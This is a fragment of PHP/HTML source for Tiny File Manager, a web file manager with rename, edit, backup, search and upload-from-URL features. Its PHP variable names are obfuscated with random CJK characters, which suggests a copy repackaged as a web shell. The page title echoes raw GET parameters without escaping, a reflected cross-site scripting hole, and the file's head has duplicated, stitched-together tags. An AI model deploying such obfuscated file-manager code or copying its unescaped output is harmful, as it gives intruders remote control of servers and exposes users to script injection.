        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>


<meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="<?= $沣併沣併檲亜伝妱锊垇 ?>">
        <?php 
if ($傦墎慵紗銇伡技堛銇) {
            echo '<link rel="icon" href="' . fm_enc($傦墎慵紗銇伡技堛銇) . '" type="image/png">';
        } ?>
        <title><?php 
echo fm_enc(APP_TITLE) ?> | <?php 
echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "H3K")); ?></title>
        <?php 
print_external('pre-jsdelivr'); ?>
        <?php 
print_external('pre-cloudflare'); ?>
        <?php 
print_external('css-bootstrap'); ?>
        <?php 
print_external('css-font-awesome'); ?>
        <?php 
if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
            <?php 
print_external('css-highlightjs'); ?>
        <?php 
endif; ?>
        <script type="text/javascript">
            window.csrf = '<?php 
echo $_SESSION['token']; ?>';
        </script>
        <style>
            html {
                -moz-osx-font-smoothing: grayscale;
                -webkit-font-smoothing: antialiased;
                text-rendering: optimizeLegibility;
                height: 100%;
                scroll-behavior: smooth;
            }

            *,
            *::before,
            *::after {
                box-sizing: border-box;
            }

            body {
                font-size: 15px;
                color: #222;
                background: #F7F7F7;
            }

            body.navbar-fixed {
                margin-top: 55px;
            }

            a,
            a:hover,
            a:visited,
            a:focus {
                text-decoration: none !important;
            }

            .filename,
            td,
            th {
                white-space: nowrap
            }

            .navbar-brand {
                font-weight: bold;
            }

            .nav-item.avatar a {
                cursor: pointer;
                text-transform: capitalize;
            }

            .nav-item.avatar a>i {
                font-size: 15px;
            }

            .nav-item.avatar .dropdown-menu a {
                font-size: 13px;
            }

            #search-addon {
                font-size: 12px;
                border-right-width: 0;
            }

            .brl-0 {
                background: transparent;
                border-left: 0;
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }

            .brr-0 {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }

            .bread-crumb {
                color: #cccccc;
                font-style: normal;
            }

            #main-table {
                transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1), width 0s .25s;
            }

            #main-table .filename a {
                color: #222222;
            }

            .table td,
            .table th {
                vertical-align: middle !important;
            }

            .table .custom-checkbox-td .custom-control.custom-checkbox,
            .table .custom-checkbox-header .custom-control.custom-checkbox {
                min-width: 18px;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .table-sm td,
            .table-sm th {
                padding: .4rem;
            }

            .table-bordered td,
            .table-bordered th {
                border: 1px solid #f1f1f1;
            }

            .hidden {
                display: none
            }

            pre.with-hljs {
                padding: 0;
                overflow: hidden;
            }

            pre.with-hljs code {
                margin: 0;
                border: 0;
                overflow: scroll;
            }

            code.maxheight,
            pre.maxheight {
                max-height: 512px
            }

            .fa.fa-caret-right {
                font-size: 1.2em;
                margin: 0 4px;
                vertical-align: middle;
                color: #ececec
            }

            .fa.fa-home {
                font-size: 1.3em;
                vertical-align: bottom
            }

            .path {
                margin-bottom: 10px
            }

            form.dropzone {
                min-height: 200px;
                border: 2px dashed #007bff;
                line-height: 6rem;
            }

            .right {
                text-align: right
            }

            .center,
            .close,
            .login-form,
            .preview-img-container {
                text-align: center
            }

            .message {
                padding: 4px 7px;
                border: 1px solid #ddd;
                background-color: #fff
            }

            .message.ok {
                border-color: green;
                color: green
            }

            .message.error {
                border-color: red;
                color: red
            }

            .message.alert {
                border-color: orange;
                color: orange
            }

            .preview-img {
                max-width: 100%;
                max-height: 80vh;
                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);
                cursor: zoom-in
            }

            input#preview-img-zoomCheck[type=checkbox] {
                display: none
            }

            input#preview-img-zoomCheck[type=checkbox]:checked~label>img {
                max-width: none;
                max-height: none;
                cursor: zoom-out
            }

            .inline-actions>a>i {
                font-size: 1em;
                margin-left: 5px;
                background: #3785c1;
                color: #fff;
                padding: 3px 4px;
                border-radius: 3px;
            }

            .preview-video {
                position: relative;
                max-width: 100%;
                height: 0;
                padding-bottom: 62.5%;
                margin-bottom: 10px
            }

            .preview-video video {
                position: absolute;
                width: 100%;
                height: 100%;
                left: 0;
                top: 0;
                background: #000
            }

            .compact-table {
                border: 0;
                width: auto
            }

            .compact-table td,
            .compact-table th {
                width: 100px;
                border: 0;
                text-align: center
            }

            .compact-table tr:hover td {
                background-color: #fff
            }

            .filename {
                max-width: 420px;
                overflow: hidden;
                text-overflow: ellipsis
            }

            .break-word {
                word-wrap: break-word;
                margin-left: 30px
            }

            .break-word.float-left a {
                color: #7d7d7d
            }

            .break-word+.float-right {
                padding-right: 30px;
                position: relative
            }

            .break-word+.float-right>a {
                color: #7d7d7d;
                font-size: 1.2em;
                margin-right: 4px
            }

            #editor {
                position: absolute;
                right: 15px;
                top: 100px;
                bottom: 15px;
                left: 15px
            }

            @media (max-width:481px) {
                #editor {
                    top: 150px;
                }
            }

            #normal-editor {
                border-radius: 3px;
                border-width: 2px;
                padding: 10px;
                outline: none;
            }

            .btn-2 {
                padding: 4px 10px;
                font-size: small;
            }

            li.file:before,
            li.folder:before {
                font: normal normal normal 14px/1 FontAwesome;
                content: "\f016";
                margin-right: 5px
            }

            li.folder:before {
                content: "\f114"
            }

            i.fa.fa-folder-o {
                color: #0157b3
            }

            i.fa.fa-picture-o {
                color: #26b99a
            }

            i.fa.fa-file-archive-o {
                color: #da7d7d
            }

            .btn-2 i.fa.fa-file-archive-o {
                color: inherit
            }

            i.fa.fa-css3 {
                color: #f36fa0
            }

            i.fa.fa-file-code-o {
                color: #007bff
            }

            i.fa.fa-code {
                color: #cc4b4c
            }

            i.fa.fa-file-text-o {
                color: #0096e6
            }

            i.fa.fa-html5 {
                color: #d75e72
            }

            i.fa.fa-file-excel-o {
                color: #09c55d
            }

            i.fa.fa-file-powerpoint-o {
                color: #f6712e
            }

            i.go-back {
                font-size: 1.2em;
                color: #007bff;
            }

            .main-nav {
                padding: 0.2rem 1rem;
                box-shadow: 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)
            }

            .dataTables_filter {
                display: none;
            }

            table.dataTable thead .sorting {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC');
            }

            table.dataTable thead .sorting_asc {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg==');
            }

            table.dataTable thead .sorting_desc {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII=');
            }

            table.dataTable thead tr:first-child th.custom-checkbox-header:first-child {
                background-image: none;
            }

            .footer-action li {
                margin-bottom: 10px;
            }

            .app-v-title {
                font-size: 24px;
                font-weight: 300;
                letter-spacing: -.5px;
                text-transform: uppercase;
            }

            hr.custom-hr {
                border-top: 1px dashed #8c8b8b;
                border-bottom: 1px dashed #fff;
            }

            #snackbar {
                visibility: hidden;
                min-width: 250px;
                margin-left: -125px;
                background-color: #333;
                color: #fff;
                text-align: center;
                border-radius: 2px;
                padding: 16px;
                position: fixed;
                z-index: 1;
                left: 50%;
                bottom: 30px;
                font-size: 17px;
            }

            #snackbar.show {
                visibility: visible;
                -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
                animation: fadein 0.5s, fadeout 0.5s 2.5s;
            }

            @-webkit-keyframes fadein {
                from {
                    bottom: 0;
                    opacity: 0;
                }

                to {
                    bottom: 30px;
                    opacity: 1;
                }
            }

            @keyframes fadein {
                from {
                    bottom: 0;
                    opacity: 0;
                }

                to {
                    bottom: 30px;
                    opacity: 1;
                }
            }

            @-webkit-keyframes fadeout {
                from {
                    bottom: 30px;
                    opacity: 1;
                }

                to {
                    bottom: 0;
                    opacity: 0;
                }
            }

            @keyframes fadeout {
                from {
                    bottom: 30px;
                    opacity: 1;
                }

                to {
                    bottom: 0;
                    opacity: 0;
                }
            }

            #main-table span.badge {
                border-bottom: 2px solid #f8f9fa
            }

            #main-table span.badge:nth-child(1) {
                border-color: #df4227
            }

            #main-table span.badge:nth-child(2) {
                border-color: #f8b600
            }

            #main-table span.badge:nth-child(3) {
                border-color: #00bd60
            }

            #main-table span.badge:nth-child(4) {
                border-color: #4581ff
            }

            #main-table span.badge:nth-child(5) {
                border-color: #ac68fc
            }

            #main-table span.badge:nth-child(6) {
                border-color: #45c3d2
            }

            @media only screen and (min-device-width:768px) 
 {
                .navbar-collapse .col-xs-6 {
                    padding: 0;
                }
            }

            .btn.active.focus,
            .btn.active:focus,
            .btn.focus,
            .btn.focus:active,
            .btn:active:focus,
            .btn:focus {
                outline: 0 !important;
                outline-offset: 0 !important;
                background-image: none !important;
                -webkit-box-shadow: none !important;
                box-shadow: none !important
            }

            .lds-facebook {
                display: none;
                position: relative;
                width: 64px;
                height: 64px
            }

            .lds-facebook div,
            .lds-facebook.show-me {
                display: inline-block
            }

            .lds-facebook div {
                position: absolute;
                left: 6px;
                width: 13px;
                background: #007bff;
                animation: lds-facebook 1.2s cubic-bezier(0, .5, .5, 1) infinite
            }

            .lds-facebook div:nth-child(1) {
                left: 6px;
                animation-delay: -.24s
            }

            .lds-facebook div:nth-child(2) {
                left: 26px;
                animation-delay: -.12s
            }

            .lds-facebook div:nth-child(3) {
                left: 45px;
                animation-delay: 0s
            }

            @keyframes lds-facebook {
                0% {
                    top: 6px;
                    height: 51px
                }

                100%,
                50% {
                    top: 19px;
                    height: 26px
                }
            }

            ul#search-wrapper {
                padding-left: 0;
                border: 1px solid #ecececcc;
            }

            ul#search-wrapper li {
                list-style: none;
                padding: 5px;
                border-bottom: 1px solid #ecececcc;
            }

            ul#search-wrapper li:nth-child(odd) {
                background: #f9f9f9cc;
            }

            .c-preview-img {
                max-width: 300px;
            }

            .border-radius-0 {
                border-radius: 0;
            }

            .float-right {
                float: right;
            }

            .table-hover>tbody>tr:hover>td:first-child {
                border-left: 1px solid #1b77fd;
            }

            #main-table tr.even {
                background-color: #F8F9Fa;
            }

            .filename>a>i {
                margin-right: 3px;
            }

            .fs-7 {
                font-size: 14px;
            }
        </style>
        <?php

        if (FM_THEME == "dark"): ?>
            <style>
                :root {
                    --bs-bg-opacity: 1;
                    --bg-color: #f3daa6;
                    --bs-dark-rgb: 28, 36, 41 !important;
                    --bs-bg-opacity: 1;
                }

                body.theme-dark {
                    background-image: linear-gradient(90deg, #1c2429, #263238);
                    color: #CFD8DC;
                }

                .list-group .list-group-item {
                    background: #343a40;
                }

                .theme-dark .navbar-nav i,
                .navbar-nav .dropdown-toggle,
                .break-word {
                    color: #CFD8DC;
                }

                a,
                a:hover,
                a:visited,
                a:active,
                #main-table .filename a,
                i.fa.fa-folder-o,
                i.go-back {
                    color: var(--bg-color);
                }

                ul#search-wrapper li:nth-child(odd) {
                    background: #212a2f;
                }

                .theme-dark .btn-outline-primary {
                    color: #b8e59c;
                    border-color: #b8e59c;
                }

                .theme-dark .btn-outline-primary:hover,
                .theme-dark .btn-outline-primary:active {
                    background-color: #2d4121;
                }

                .theme-dark input.form-control {
                    background-color: #101518;
                    color: #CFD8DC;
                }

                .theme-dark .dropzone {
                    background: transparent;
                }

                .theme-dark .inline-actions>a>i {
                    background: #79755e;
                }

                .theme-dark .text-white {
                    color: #CFD8DC !important;
                }

                .theme-dark .table-bordered td,
                .table-bordered th {
                    border-color: #343434;
                }

                .theme-dark .table-bordered td .custom-control-input,
                .theme-dark .table-bordered th .custom-control-input {
                    opacity: 0.678;
                }

                .message {
                    background-color: #212529;
                }

                form.dropzone {
                    border-color: #79755e;
                }
            </style>
        <?php 
endif; ?>
    </head>

    <body class="<?php 
echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php 
echo $堛紒亪併澋暉笺紒愀仸; ?>">
        <div id="wrapper" class="container-fluid">
            <!-- New Item creation -->
            <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog" role="document">
                    <form class="modal-content" method="post">
                        <div class="modal-header">
                            <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php 
echo lng('CreateNewItem') ?></h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <p><label for="newfile"><?php 
echo lng('ItemType') ?> </label></p>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                                <label class="form-check-label" for="customRadioInline1"><?php 
echo lng('File') ?></label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                                <label class="form-check-label" for="customRadioInline2"><?php 
echo lng('Folder') ?></label>
                            </div>

                            <p class="mt-3"><label for="newfilename"><?php 
echo lng('ItemName') ?> </label></p>
                            <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php 
echo lng('Enter here...') ?>" required>
                        </div>
                        <div class="modal-footer">
                            <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                            <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></button>
                            <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('CreateNow') ?></button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Advance Search Modal -->
            <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog modal-lg" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title col-10" id="searchModalLabel">
                                <div class="input-group mb-3">
                                    <input type="text" class="form-control" placeholder="<?php 
echo lng('Search') ?> <?php 
echo lng('a files') ?>" aria-label="<?php 
echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                                    <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                                </div>
                            </h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <form action="" method="post">
                                <div class="lds-facebook">
                                    <div></div>
                                    <div></div>
                                    <div></div>
                                </div>
                                <ul id="search-wrapper">
                                    <p class="m-2"><?php 
echo lng('Search file in folder and subfolders...') ?></p>
                                </ul>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!--Rename Modal -->
            <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog" role="document">
                    <form class="modal-content rounded-3 shadow" method="post" autocomplete="off">
                        <div class="modal-body p-4 text-center">
                            <h5 class="mb-3"><?php 
echo lng('Are you sure want to rename?') ?></h5>
                            <p class="mb-1">
                                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php 
echo lng('Enter new file name') ?>" required>
                                <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                                <input type="hidden" name="rename_from" id="js-rename-from">
                            </p>
                        </div>
                        <div class="modal-footer flex-nowrap p-0">
                            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php 
echo lng('Cancel') ?></button>
                            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php 
echo lng('Okay') ?></strong></button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Confirm Modal -->
            <script type="text/html" id="js-tpl-confirm">
                <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>" data-bs-theme="<?php 
echo FM_THEME; ?>">
                    <div class="modal-dialog" role="document">
                        <form class="modal-content rounded-3 shadow" method="post" autocomplete="off" action="<%this.action%>">
                            <div class="modal-body p-4 text-center">
                                <h5 class="mb-2"><?php 
echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
                                <p class="mb-1"><%this.content%></p>
                            </div>
                            <div class="modal-footer flex-nowrap p-0">
                                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php 
echo lng('Cancel') ?></button>
                                <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php 
echo lng('Okay') ?></strong></button>
                            </div>
                        </form>
                    </div>
                </div>
            </script>
        <?php

    }

    /**
     * Show page footer after login
     */
    function fm_show_footer()
    {
        ?>
        </div>
        <?php 
print_external('js-jquery'); ?>
        <?php 
print_external('js-bootstrap'); ?>
        <?php 
print_external('js-jquery-datatables'); ?>
        <?php 
if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
            <?php 
print_external('js-highlightjs'); ?>
            <script>
                hljs.highlightAll();
                var isHighlightingEnabled = true;
            </script>
        <?php 
endif; ?>
        <script>
            function template(html, options) {
                var re = /<\%([^\%>]+)?\%>/g,
                    reExp = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,
                    code = 'var r=[];\n',
                    cursor = 0,
                    match;
                var add = function(line, js) {
                    js ? (code += line.match(reExp) ? line + '\n' : 'r.push(' + line + ');\n') : (code += line != '' ? 'r.push("' + line.replace(/"/g, '\\"') + '");\n' : '');
                    return add
                }
                while (match = re.exec(html)) {
                    add(html.slice(cursor, match.index))(match[1], !0);
                    cursor = match.index + match[0].length
                }
                add(html.substr(cursor, html.length - cursor));
                code += 'return r.join("");';
                return new Function(code.replace(/[\r\t\n]/g, '')).apply(options)
            }

            function rename(e, t) {
                if (t) {
                    $("#js-rename-from").val(t);
                    $("#js-rename-to").val(t);
                    $("#renameDailog").modal('show');
                }
            }

            function change_checkboxes(e, t) {
                for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked
            }

            function get_checkboxes() {
                for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--)(e[n].type = "checkbox") && t.push(e[n]);
                return t
            }

            function select_all() {
                change_checkboxes(get_checkboxes(), !0)
            }

            function unselect_all() {
                change_checkboxes(get_checkboxes(), !1)
            }

            function invert_all() {
                change_checkboxes(get_checkboxes())
            }

            function checkbox_toggle() {
                var e = get_checkboxes();
                e.push(this), change_checkboxes(e)
            }

            // Create file backup with .bck
            function backup(e, t) {
                var n = new XMLHttpRequest,
                    a = "path=" + e + "&file=" + t + "&token=" + window.csrf + "&type=backup&ajax=true";
                return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function() {
                    4 == n.readyState && 200 == n.status && toast(n.responseText)
                }, n.send(a), !1
            }

            // Toast message
            function toast(txt) {
                var x = document.getElementById("snackbar");
                x.innerHTML = txt;
                x.className = "show";
                setTimeout(function() {
                    x.className = x.className.replace("show", "");
                }, 3000);
            }

            // Save file
            function edit_save(e, t) {
                var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
                if (typeof n !== 'undefined' && n !== null) {
                    if (true) {
                        var data = {
                            ajax: true,
                            content: n,
                            type: 'save',
                            token: window.csrf
                        };

                        $.ajax({
                            type: "POST",
                            url: window.location,
                            data: JSON.stringify(data),
                            contentType: "application/json; charset=utf-8",
                            success: function(mes) {
                                toast("Saved Successfully");
                                window.onbeforeunload = function() {
                                    return
                                }
                            },
                            failure: function(mes) {
                                toast("Error: try again");
                            },
                            error: function(mes) {
                                toast(`<p style="background-color:red">${mes.responseText}</p>`);
                            }
                        });
                    } else {
                        var a = document.createElement("form");
                        a.setAttribute("method", "POST"), a.setAttribute("action", "");
                        var o = document.createElement("textarea");
                        o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                        let cx = document.createElement("input");
                        cx.setAttribute("type", "hidden");
                        cx.setAttribute("name", "token");
                        cx.setAttribute("value", window.csrf);
                        var c = document.createTextNode(n);
                        o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
                    }
                }
            }

            function show_new_pwd() {
                $(".js-new-pwd").toggleClass('hidden');
            }

            // Save Settings
            function save_settings($this) {
                let form = $($this);
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            window.location.reload();
                        }
                    }
                });
                return false;
            }

            //Create new password hash
            function new_password_hash($this) {
                let form = $($this),
                    $pwd = $("#js-pwd-result");
                $pwd.val('');
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            $pwd.val(data);
                        }
                    }
                });
                return false;
            }

            // Upload files using URL @param {Object}
            function upload_from_url($this) {
                let form = $($this),
                    resultWrapper = $("div#js-url-upload__list");
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    beforeSend: function() {
                        form.find("input[name=uploadurl]").attr("disabled", "disabled");
                        form.find("button").hide();
                        form.find(".lds-facebook").addClass('show-me');
                    },
                    success: function(data) {
                        if (data) {
                            data = JSON.parse(data);
                            if (data.done) {
                                resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: ' + data.done.name + '</div>');
                                form.find("input[name=uploadurl]").val('');
                            } else if (data['fail']) {
                                resultWrapper.append('<div class="alert alert-danger row">Error: ' + data.fail.message + '</div>');
                            }
                            form.find("input[name=uploadurl]").removeAttr("disabled");
                            form.find("button").show();
                            form.find(".lds-facebook").removeClass('show-me');
                        }
                    },
                    error: function(xhr) {
                        form.find("input[name=uploadurl]").removeAttr("disabled");
                        form.find("button").show();
                        form.find(".lds-facebook").removeClass('show-me');
                        console.error(xhr);
                    }
                });
                return false;
            }

            // Search template
            function search_template(data) {
                var response = "";
                $.each(data, function(key, val) {
                    response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
                });
                return response;
            }

            // Advance search
            function fm_search() {
                var searchTxt = $("input#advanced-search").val(),
                    searchWrapper = $("ul#search-wrapper"),
                    path = $("#js-search-modal").attr("href"),
                    _html = "",
                    $loader = $("div.lds-facebook");
                if (!!searchTxt && searchTxt.length > 2 && path) {
                    var data = {
                        ajax: true,
                        content: searchTxt,
                        path: path,
                        type: 'search',
                        token: window.csrf
                    };
                    $.ajax({
                        type: "POST",
                        url: window.location,
                        data: data,
                        beforeSend: function() {
                            searchWrapper.html('');
                            $loader.addClass('show-me');
                        },
                        success: function(data) {
                            $loader.removeClass('show-me');
                            data = JSON.parse(data);
                            if (data && data.length) {
                                _html = search_template(data);
                                searchWrapper.html(_html);
                            } else {
                                searchWrapper.html('<p class="m-2">No result found!<p>');
                            }
                        },
                        error: function(xhr) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');
                        },
                        failure: function(mes) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');
                        }
                    });
                } else {
                    searchWrapper.html("OOPS: minimum 3 characters required!");
                }
            }

            // action confirm dailog modal
            function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
                e.preventDefault();
                const tplObj = {
                    id,
                    title,
                    content: decodeURIComponent(content.replace(/\+/g, ' ')),
                    action
                };
                let tpl = $("#js-tpl-confirm").html();
                $(".modal.confirmDailog").remove();
                $('#wrapper').append(template(tpl, tplObj));
                const $confirmDailog = $("#confirmDailog-" + tplObj.id);
                $confirmDailog.modal('show');
                return false;
            }

            // on mouse hover image preview
            ! function(s) {
                s.previewImage = function(e) {
                    var o = s(document),
                        t = ".previewImage",
                        a = s.extend({
                            xOffset: 20,
                            yOffset: -20,
                            fadeIn: "fast",
                            css: {
                                padding: "5px",
                                border: "1px solid #cccccc",
                                "background-color": "#fff"
                            },
                            eventSelector: "[data-preview-image]",
                            dataKey: "previewImage",
                            overlayId: "preview-image-plugin-overlay"
                        }, e);
                    return o.off(t), o.on("mouseover" + t, a.eventSelector, function(e) {
                        s("p#" + a.overlayId).remove();
                        var o = s("<p>").attr("id", a.overlayId).css("position", "absolute").css("display", "none").append(s('<img class="c-preview-img">').attr("src", s(this).data(a.dataKey)));
                        a.css && o.css(a.css), s("body").append(o), o.css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px").fadeIn(a.fadeIn)
                    }), o.on("mouseout" + t, a.eventSelector, function() {
                        s("#" + a.overlayId).remove()
                    }), o.on("mousemove" + t, a.eventSelector, function(e) {
                        s("#" + a.overlayId).css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px")
                    }), this
                }, s.previewImage()
            }(jQuery);

            // Dom Ready Events
            $(document).ready(function() {
                // dataTable init
                var $table = $('#main-table'),
                    tableLng = $table.find('th').length,
                    _targets = (tableLng && tableLng == 7) ? [0, 4, 5, 6] : tableLng == 5 ? [0, 4] : [3];
                mainTable = $('#main-table').DataTable({
                    paging: false,
                    info: false,
                    order: [],
                    columnDefs: [{
                        targets: _targets,
                        orderable: false
                    }]
                });

                // filter table
                $('#search-addon').on('keyup', function() {
                    mainTable.search(this.value).draw();
                });

                $("input#advanced-search").on('keyup', function(e) {
                    if (e.keyCode === 13) {
                        fm_search();
                    }
                });

                $('#search-addon3').on('click', function() {
                    fm_search();
                });

                //upload nav tabs
                $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e) {
                    e.preventDefault();
                    let target = $(this).data('target');
                    $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');
                    $(this).addClass('active');
                    $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');
                    $(target).removeClass('hidden');
                });
            });
        </script>

        <?php 
if (isset($_GET['edit']) && isset($_GET['env']) && FM_EDIT_FILE && !FM_READONLY):
            $沣銈倐娿珎併墎壖併飦 = pathinfo($_GET["edit"], PATHINFO_EXTENSION);
            $沣銈倐娿珎併墎壖併飦 =  $沣銈倐娿珎併墎壖併飦 == "js" ? "javascript" :  $沣銈倐娿珎併墎壖併飦;
        ?>
            <?php 
print_external('js-ace'); ?>
            <script>
                var editor = ace.edit("editor");
                editor.getSession().setMode({
                    path: "ace/mode/<?php 
echo $沣銈倐娿珎併墎壖併飦; ?>",
                    inline: true
                });
                //editor.setTheme("ace/theme/twilight"); // Dark Theme
                editor.setShowPrintMargin(false); // Hide the vertical ruler
                function ace_commend(cmd) {
                    editor.commands.exec(cmd, editor);
                }
                editor.commands.addCommands([{
                    name: 'save',
                    bindKey: {
                        win: 'Ctrl-S',
                        mac: 'Command-S'
                    },
                    exec: function(editor) {
                        edit_save(this, 'ace');
                    }
                }]);

                function renderThemeMode() {
                    var $modeEl = $("select#js-ace-mode"),
                        $themeEl = $("select#js-ace-theme"),
                        $fontSizeEl = $("select#js-ace-fontSize"),
                        optionNode = function(type, arr) {
                            var $Option = "";
                            $.each(arr, function(i, val) {
                                $Option += "<option value='" + type + i + "'>" + val + "</option>";
                            });
                            return $Option;
                        },
                        _data = {
                            "aceTheme": {
                                "bright": {
                                    "chrome": "Chrome",
